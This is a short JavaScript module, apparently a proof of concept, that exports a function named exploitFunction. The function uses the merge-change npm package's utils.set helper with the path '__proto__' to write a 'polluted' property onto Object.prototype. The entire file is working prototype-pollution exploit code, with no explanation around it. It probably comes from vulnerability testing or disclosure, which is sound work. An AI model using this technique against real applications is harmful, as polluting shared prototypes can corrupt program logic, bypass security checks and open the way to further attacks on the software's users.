function exploitFunction(obj) {
    require("merge-change").utils.set(obj, ["__proto__", "polluted"], "yes");
}

module.exports = { exploitFunction };